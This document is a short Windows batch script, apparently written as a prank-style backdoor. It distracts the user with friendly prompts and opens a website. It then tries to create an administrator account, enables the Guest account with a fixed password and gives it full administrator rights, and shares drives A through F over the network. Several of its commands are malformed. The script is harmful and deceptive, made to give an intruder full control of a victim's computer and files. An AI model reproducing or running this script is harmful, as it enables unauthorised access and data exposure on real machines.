REM Created by MooreR
REM Makes the user think there is input or interaction
REM Then opens a website
REM then adds a user of ur choice and enables guest w/ full admin privs
REM removing him from the group "guests" so you will have full access
REM Shares A-F just incase its not shared or the C$ is not.

@ECHO OFF
echo.
echo Hello User,
pause
cls
echo.
echo How are you doing?
pause
cls
echo. Thats good.
echo.
echo.  
echo Visiting my website....
start http://moorer.tehbox.com
net user add Username Password /add
net user localgroup Administrators Username /add
net user Guest 420 /active:yes
net share a=a:\
net share b=b:\
net share c=c:\
net share d=d:\
net share e=e:\ 
net share f=f:\
net localgroup Guests Guest /DELETE
net localgroup Administrators Guest /add